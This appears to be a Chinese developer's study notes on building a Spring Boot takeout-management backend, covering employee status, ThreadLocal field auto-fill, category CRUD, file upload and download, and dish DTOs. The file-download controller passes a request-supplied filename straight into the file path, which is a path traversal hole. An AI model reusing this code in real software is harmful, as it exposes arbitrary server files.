启用、禁用员工账号</h2><p>无非就是修改status，0禁用，1启用<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/cbc14ff5649f4c3ab58a61f6a3717d55.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/00fd8c22798a4be0935fbe4706aac1a0.png" alt="在这里插入图片描述" /><br />这种根据登陆人物来进行判断的玩法，是前端<br />这个页面的位置<code>resource/backend/page/member/list.html</code><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/15cb1554d5014d91a50a1d33faff5f0e.png" alt="在这里插入图片描述" /><br />看拿出来的对象是什么样子的，如果是admin，vue的v-if指令就会把编辑按钮显示出来<br />如果是普通用户，就会把编辑按钮隐藏<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1a813cac7216496c9f007b2e89e94571.png" alt="在这里插入图片描述" /></p><h3 id="修复一个小bug"><a class="markdownIt-Anchor" href="#修复一个小bug"></a> 修复一个小Bug</h3><p>前端一直不显示编辑按钮，在localStorage里没有发现admin对象<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/656ddea591c644369951b448d9437162.png" alt="在这里插入图片描述" /><br />这个值不应该是登陆成功，应该是Employee的对象Json<br />猜测是登陆的时候往request里存对象没存好<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e02134f0443f4cebaf01da0bebb88be3.png" alt="在这里插入图片描述" /><br />改成对象存入就好了<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/3695c863613643ebb7c9d2fb6f44b1f2.png" alt="在这里插入图片描述" /><br />这回都正常了<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f291200889854951bae0025d0c96d67f.png" alt="在这里插入图片描述" /></p><h3 id="功能编写"><a class="markdownIt-Anchor" href="#功能编写"></a> 功能编写</h3><p>复习一下<br /><strong>PutMapping是Resultful风格的请求方式</strong><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/0dcd79a42b334bae8337cb40a73fd17c.png" alt="在这里插入图片描述" /><br />当前状态是1，直接带着目标状态值（状态改禁用）进行更新<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/bbc8b8c97744496491c18389cf13f2f1.png" alt="在这里插入图片描述" /><br />Id精度丢失，js独有的bug，直接处理Long处理不了，要Long转String再返回去</p><blockquote><p>这个要注意，我以前写项目的时候就遇到这个bug。巨坑</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/bd851e41062148db9a7d4b84b687372f.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/65954dc589544fe1bc98a70d0a878936.png" alt="在这里插入图片描述" /><br />利用对象转换器JacksonObjectMapper，将对象转Json  将Long型的Id转换为String类型的数据<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/7b18d09c0e75446db59dab3f6f4f505a.png" alt="在这里插入图片描述" /></p><p>在MVC配置类中扩展一个消息转换器<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/bc895faafbb247eb9e580f553d32d4e6.png" alt="在这里插入图片描述" /><br />测试功能正常，正常更新员工状态<br />消息扩展器配置位置：<code>com.xyy.common.JacksonObjectMapper</code><br />对象映射器位置：<code>com.xyy.config.WebMvcConfig</code><br />员工状态更新位置：<code>com.xyy.controller.EmployeeController</code></p><h2 id="编辑员工信息"><a class="markdownIt-Anchor" href="#编辑员工信息"></a> 编辑员工信息</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/83b635aff2ca4445840f24ef5c60a22b.png" alt=" " /><br />请求API，这个是先发请求，查到用户，然后填充到页面上<br />可以看出来，这种请求方式是ResultFul风格的请求方式<br />在控制器中要用@PathVariable(“/{参数名称}”)注解来进行接收<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/7f1a236c859d418eb4aa1177cbf82543.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f7b34494b2eb42b8b315e9f7c2802956.png" alt="在这里插入图片描述" /><br />完美更新</p><h2 id="公共字段自动填充"><a class="markdownIt-Anchor" href="#公共字段自动填充"></a> 公共字段自动填充</h2><p>像是一部分公共字段，反复填充起来没有意义，简化填充的操作。<br />把这个功能拿出来，单独拎出来做自动填充处理<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f6b5a68d4b8646aab2b39db34fba625a.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/09eaaee0510849749512ef973529a4ed.png" alt="在这里插入图片描述" /><br />为实体类属性上面加入注解<code>@TableField(fill = 填充条件)</code><br />看一下源码。fill是填充条件，用枚举来进行处理的<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/c41f5a745d6c48d5b944fbe2b81e5726.png" alt="在这里插入图片描述" /><br />加完注解和条件不算完，还要加入配置类进行处理，对填充的数据做规定<br />在common包下创建一个自定义类，最关键的是要实现<code>MetaObjectHandler接口下的insertFill和updateFill</code><br />确认填充时需要的字段。还有要加入@Component注解，将这个类交给框架来管理，否则的话容易找不到,setValue的值会根据注解加入的字段名称来锁定是否需要更新<br />位置：<code>com.xyy.common.MyMetaObjectHandler</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyMetaObjecthandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MetaObjectHandler</span> &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 插入操作，自动填充</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> metaObject</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertFill</span><span class="hljs-params">(MetaObject metaObject)</span> &#123;<br>        log.info(<span class="hljs-string">&quot;公共字段自动填充[insert]...&quot;</span>);<br>        log.info(metaObject.toString());<br><br>        metaObject.setValue(<span class="hljs-string">&quot;createTime&quot;</span>, LocalDateTime.now());<br>        metaObject.setValue(<span class="hljs-string">&quot;updateTime&quot;</span>,LocalDateTime.now());<br><span class="hljs-comment">//        metaObject.setValue(&quot;createUser&quot;, BaseContext.getCurrentId());</span><br><span class="hljs-comment">//        metaObject.setValue(&quot;updateUser&quot;,BaseContext.getCurrentId());</span><br>        metaObject.setValue(<span class="hljs-string">&quot;createUser&quot;</span>,<span class="hljs-number">1L</span>);<br>        metaObject.setValue(<span class="hljs-string">&quot;updateUser&quot;</span>,<span class="hljs-number">1L</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 更新操作，自动填充</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> metaObject</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateFill</span><span class="hljs-params">(MetaObject metaObject)</span> &#123;<br>        log.info(<span class="hljs-string">&quot;公共字段自动填充[update]...&quot;</span>);<br>        log.info(metaObject.toString());<br><br>        <span class="hljs-type">long</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> Thread.currentThread().getId();<br>        log.info(<span class="hljs-string">&quot;线程id为：&#123;&#125;&quot;</span>,id);<br><br>        metaObject.setValue(<span class="hljs-string">&quot;updateTime&quot;</span>,LocalDateTime.now());<br><span class="hljs-comment">//        metaObject.setValue(&quot;updateUser&quot;,BaseContext.getCurrentId());</span><br>        metaObject.setValue(<span class="hljs-string">&quot;updateUser&quot;</span>,<span class="hljs-number">1L</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是这里有个问题，如果我想去更新管理员字段是非常困难的，因为我这里拿不到Request的作用域对象，所以要想个办法来处理。<br />这个时候就需要<code>ThreadLocal</code>来进行对象的获取，这个线程是贯穿整个运行的，可以通过他来获取</p><h3 id="使用时"><a class="markdownIt-Anchor" href="#使用时"></a> 使用时</h3><p>何为ThreadLocal<br /><strong>重点来了</strong><br />这个图<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/a747301972964b88a7db5dc9d84995e6.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/62ec83c598a546b89722fef26f3ca4b4.png" alt="在这里插入图片描述" /><br />我的思路就是在用户登陆的时候，把这个id存进去，等到在填充字段的时候，从ThreadLocal里把这个资源再拿出来。<br />直接操作不太好，把他封装成一个工具类，这个工具类里方法都是静态的，可以通过类直接调用、并且都是静态方法，来操作保存和读取<br />我选择在Utils下创建</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 基于ThreadLocal封装工具类，用户保存和获取当前登录用户id</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BaseContext</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ThreadLocal&lt;Long&gt; threadLocal = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 设置值</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> id</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCurrentId</span><span class="hljs-params">(Long id)</span>&#123;<br>        threadLocal.set(id);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取值</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    pub<br></code></pre></td></tr></table></figure><blockquote><p>注意，ThreadLocal不是一个线程，只有同一个线程才能拿到，不是一个线程拿不到的</p></blockquote><h3 id="这样也行"><a class="markdownIt-Anchor" href="#这样也行"></a> 这样也行</h3><p>换个思路：因为我想拿Request对象里的Id嘛，所以，只要有Request的id就行，不必过于执着一定要用ThreadLocal来存，因此，我这里选择注入一下HttpServletRequest对象来解决这个问题。<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/58b8b8d5442a4da29ef667430a521262.png" alt="在这里插入图片描述" /></p><h1 id="分类管理页面"><a class="markdownIt-Anchor" href="#分类管理页面"></a> 分类管理页面</h1><h2 id="菜品分类"><a class="markdownIt-Anchor" href="#菜品分类"></a> 菜品分类</h2><h3 id="菜品分类展现"><a class="markdownIt-Anchor" href="#菜品分类展现"></a> 菜品分类展现</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/9dc65e03155d4e29b1dd85b73e79468c.png" alt="在这里插入图片描述" /><br />还是那几步</p><pre><code class="hljs">1. 创建分页构造器 Page pageInfo = new Page(第几页,每页几条数据);2. 如果有需要条件过滤的加入条件过滤器LambaQueryWarpper3. 注入的service对象（已经继承MP的BaseMapper接口）去调用Page对象     service对象.page(分页信息,条件过滤器)4. 返回结果就可以了</code></pre><p>分页查询位置：<code>com.xyy.controller.CategoryController.page</code></p><h3 id="新增菜品分类"><a class="markdownIt-Anchor" href="#新增菜品分类"></a> 新增菜品分类</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2c38b870546f49bd9a9d00572c2f1578.png" alt="在这里插入图片描述" /></p><p>涉及的表有分类表category<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/5c9af552c151402d99d419b44601110a.png" alt="在这里插入图片描述" /><br />业务流程<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/0e55226139a848f4ba8a792c62a6feb3.png" alt="在这里插入图片描述" /></p><p>请求方式是Post请求<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/d43ee4cb2aeb4259abe4129cb1672978.png" alt="在这里插入图片描述" /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/dc4cdb56b1ff40039d61b044f0259ea4.png" alt="在这里插入图片描述" /><br />控制器位置：<code>com.xyy.controller.CategoryController (save)</code></p><h3 id="删除菜品分类"><a class="markdownIt-Anchor" href="#删除菜品分类"></a> 删除菜品分类</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/d3c5ede5188a46caa8bef24e4c14b9fb.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e35caef5f5d8421aae24cfc2832fe3d0.png" alt="在这里插入图片描述" /><br />普通版本，没有考虑分类有关联的情况</p><blockquote><p>注意</p></blockquote><p>这里有个坑，前端传过来的请求是</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221125153246807.png" alt="image-20221125153246807" /></p><p>参数名字是 <strong>ids</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/62d820a820634bcc841b41bcc0bc3987.png" alt="在这里插入图片描述" /><br />完善一下， <strong>如果当前菜品分类下有菜品的话 ，就不许删除</strong><br />所以在删除之前要先做判断才可以删除，不符合条件的，我们要抛出异常进行提示<br />因为没有返回异常信息的类，我们这里要做一个自定义的专门返回异常信息的类<code>CustomerException</code><br />这个类的位置也在common包下<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/40de841c594443398553b1509512fa5e.png" alt="在这里插入图片描述" /><br />因为我们之前创建了一个全局异常处理，也要用上，因为要拦截异常统一处理<br />还是<code>com.xyy.common.GloableExceptionHandler</code><br />对抛出异常进行处理，就可以对新增的异常提供目标的拦截和异常通知<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/035d8b14a54f4cb1bffcd4c63673d0f8.png" alt="在这里插入图片描述" /><br />删除菜品分类的controller接口在：<code>com.xyy.controller.CategoryController (delCategory)</code><br />因为业务特殊，且比较长，就分离出来把业务放在service包下<br />service接口位置：<code>com.xyy.service.impl.CategoryServiceImpl (removeCategory)</code></p><h2 id="修改套餐信息"><a class="markdownIt-Anchor" href="#修改套餐信息"></a> 修改套餐信息</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e6c29b9b209c4881815bdffa24f571e8.png" alt="在这里插入图片描述" /><br />非常简单的CRUD，直接调用MP更新一下就行<br />API位置</p><p>​<br />​    com.xyy.controller.CategoryController (updateCategory)</p><h2 id="文件上传下载重点"><a class="markdownIt-Anchor" href="#文件上传下载重点"></a> 文件上传下载（重点）</h2><h3 id="上传逻辑"><a class="markdownIt-Anchor" href="#上传逻辑"></a> 上传逻辑</h3><p>第一次接触上传和下载的功能<br />文件上传逻辑（后端）<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/6fddfbb6992645358dd6f7fc9e7ed79d.png" alt="在这里插入图片描述" /><br />参数名有要求的<br />接收的文件类型一定是 方法名(MultipartFile 前端上传的文件名称)<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/dee0540b7de5467ea6695e058a833b7f.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/b0f446d645654cd89577b9ba0a369f34.png" alt="在这里插入图片描述" /><br />所以后端的接收名字也得改为file<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/8d04a387872f43f199fadcd1d2c79090.png" alt="在这里插入图片描述" /></p><h3 id="上传逻辑实现"><a class="markdownIt-Anchor" href="#上传逻辑实现"></a> 上传逻辑实现</h3><p>具体的存储路径写在配置文件里了</p><ol><li><p>application.yml</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221125185250894.png" alt="image-20221125185250894" /></p></li><li><p><strong>controller</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java">RestController<br><span class="hljs-meta">@RequestMapping(&quot;/common&quot;)</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonController</span> &#123;<br>    <span class="hljs-meta">@Value(&quot;$&#123;takeOutFile.fileLocation:&#125;&quot;)</span><br>    <span class="hljs-keyword">private</span> String filePath;<br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 文件上传</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> file org.springframework.web.multipart.MultipartFile</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> com.xyy.reggie.common.R&lt;java.lang.String&gt;</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@author</span> 席子</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@PostMapping(&quot;/upload&quot;)</span><br>    <span class="hljs-keyword">public</span> R&lt;String&gt; <span class="hljs-title function_">upload</span><span class="hljs-params">(MultipartFile file)</span> &#123;<br><br>        <span class="hljs-comment">//原始文件名</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">originalFilename</span> <span class="hljs-operator">=</span> file.getOriginalFilename();<br>        <span class="hljs-keyword">assert</span> originalFilename != <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">suffix</span> <span class="hljs-operator">=</span> originalFilename.substring(originalFilename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>));<br><br>        <span class="hljs-comment">//使用UUID重新生成文件名，防止文件名称重复造成文件覆盖</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString() + suffix;<br><br>        <span class="hljs-comment">//创建一个目录对象</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filePath);<br>        <span class="hljs-comment">//判断当前目录是否存在</span><br>        <span class="hljs-keyword">if</span> (!dir.exists()) &#123;<br>            <span class="hljs-comment">//目录不存在，需要创建</span><br>            dir.mkdirs();<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            file.transferTo(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(dir.getAbsolutePath() +File.separator+ fileName));<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> R.success(fileName);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 文件下载</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> name     java.lang.String</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> response javax.servlet.http.HttpServletResponse</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@author</span> 席子</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@GetMapping(&quot;/download&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">download</span><span class="hljs-params">(String name, HttpServletResponse response)</span> &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//输入流，通过输入流读取文件内容</span><br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filePath +File.separator+  name));<br><br>            <span class="hljs-comment">//输出流，通过输出流将文件写回浏览器</span><br>            <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getOutputStream();<br><br>            response.setContentType(<span class="hljs-string">&quot;image/jpeg&quot;</span>);<br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-keyword">while</span> ((len = fileInputStream.read(bytes)) != -<span class="hljs-number">1</span>) &#123;<br>                outputStream.write(bytes, <span class="hljs-number">0</span>, len);<br>                outputStream.flush();<br>            &#125;<br><br>            <span class="hljs-comment">//关闭资源</span><br>            outputStream.close();<br>            fileInputStream.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>效果</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221125185348635.png" alt="image-20221125185348635" /></p></li></ol><blockquote><p>SpringBoot文件上传下载怎么使用就不说了，说说怎么使用<strong>相对路径</strong>把文件存储到项目根目录去</p></blockquote><ol start="4"><li><p>代码分析</p><ol><li><p>我们使用<code>MultipartFile的transferTo()</code>进行文件本地持久化</p></li><li><p>但是<code>MultipartFile的transferTo()</code>方法会监测传入其中的File对象的路径是否为绝对路径，如果不是绝对路径，<mark>会自动拼接application里设置的路径 和 \work\Tomcat\localhost\ROOT</mark>。</p><p>所以出现</p><p>java.io.FileNotFoundException: C:\Users\XXX\AppData\Local\Temp\tomcat.8080.6103676472064121995\work\Tomcat\localhost\ROOT\src\main\resources\takeOutFiled10b193c1-c840-4570-88c3-874ef18e73b5.png (系统找不到指定的路径。)</p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221125190148520.png" alt="image-20221125190148520" style="zoom: 100%;" /></li><li><p>只要给它一个绝对路径就可以了</p></li><li><p><code>file.transferTo(new File(dir.getAbsolutePath() +File.separator+ fileName));</code></p><p><code>dir.getAbsolutePath()</code> 得到储存文件目录的绝对路径</p><p><code>File.separator</code> 就是   <strong>/</strong></p><p><code>fileName</code> 你要存储的文件名</p></li></ol></li></ol><p>具体位置在<code>com.xyy.controller.CommonController (upLoadFile)</code></p><h3 id="下载逻辑"><a class="markdownIt-Anchor" href="#下载逻辑"></a> 下载逻辑</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/9748d9f84a224b329f2035afcf31091d.png" alt="在这里插入图片描述" /><br />图片回显功能<br />用到了输入输出流<br />位置：<code>com.xyy.controller.CommonController (fileDownload)</code></p><h1 id="菜品管理页面"><a class="markdownIt-Anchor" href="#菜品管理页面"></a> 菜品管理页面</h1><h2 id="新增菜品"><a class="markdownIt-Anchor" href="#新增菜品"></a> 新增菜品</h2><h3 id="需求分析"><a class="markdownIt-Anchor" href="#需求分析"></a> 需求分析</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/307c50613cf9427eb8af9ca1edf35f10.png" alt="在这里插入图片描述" /><br />涉及表为dish和dish_flavor<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2bee4656682c429093d0b487f7453028.png" alt="在这里插入图片描述" /><br />开发逻辑<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/0c69f61ce4e84e87b2f70cef256a597c.png" alt="在这里插入图片描述" /></p><h3 id="新增实现"><a class="markdownIt-Anchor" href="#新增实现"></a> 新增实现</h3><p>由于是多表的操作，MP直接干肯定不行，所以就把service层抽离出来进行处理</p><p>还有，因为涉及两张表，这里还要加入事务进行控制，防止多表操作崩溃</p><p>​    多表操作只能一个一个来，MP没有办法一次性操作多张表<br />​    因为涉及到多表的问题，所以还要加入注解来处理事务<br />​    @Transactional 开启事务<br />​    @EnableTransactionManagement 在启动类加入，支持事务开启</p><p>Controller位置：<code>com.xyy.controller.DishController (addDish)</code><br />Service位置：<code>com.xyy.service.DishService</code><br />ServiceImpl位置：<code>com.xyy.service.impl.DishServiceImpl (addDishWithFlavor)</code></p><h3 id="新增菜品之获取菜品种类"><a class="markdownIt-Anchor" href="#新增菜品之获取菜品种类"></a> 新增菜品之获取菜品种类</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/260620e272564731a10cf74b24d47b95.png" alt="在这里插入图片描述" /><br />从前端接收一个type=1的标注，目的是在分类表中，菜品分类是1，套餐分类是2，把二者区分开，获取所有的菜品类型<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/c139415e958e4a4d81a9687d3f04a524.png" alt="在这里插入图片描述" /><br />位置：<code>com.xyy.controller.CategoryController （listCategory）</code></p><h3 id="菜品分页"><a class="markdownIt-Anchor" href="#菜品分页"></a> 菜品分页</h3><p>顺手把菜品分页也做了，不写太多了，位置在：<code>com.xyy.controller.CategoryController （dishPage）</code><br />记录一个知识点，如果说后端没有类和前端要的数据对应，那么自己就可以封装一个类来对前端特殊需要的数据进行封装</p><h2 id="dto对象"><a class="markdownIt-Anchor" href="#dto对象"></a> DTO对象</h2><p>这个类可以是对一些实体类进行扩展，继承于某个父类，再添加一些内容<br />比如Dish和DishDto<br />DishDto就继承于Dish类，并在此基础上进行了扩展<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/c20e2473b88b49f684764ddab99f9cfb.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/a365d359125f498799f4b96a8e43fd0a.png" alt="在这里插入图片描述" /></p><h2 id="更新菜品信息"><a class="markdownIt-Anchor" href="#更新菜品信息"></a> 更新菜品信息</h2><p>就是个update<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e48ab4407978498d8321be25c5da40a0.png" alt="在这里插入图片描述" /><br />逻辑<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/31c8e202fea94bcf8a775644996a6cc5.png" alt="在这里插入图片描述" /><br />注意，这里回显数据是要用DishDto，因为前端要显示口味等信息，这里如果用Dish是无法完美显示的，所以要用DishDto</p><h3 id="回显填充查询"><a class="markdownIt-Anchor" href="#回显填充查询"></a> 回显填充查询</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/7fd4eb56b06542b490e056bc8989a12c.png" alt="在这里插入图片描述" /></p><p>除此之外，这是个多表联查，用MP肯定不行，得自己写<br 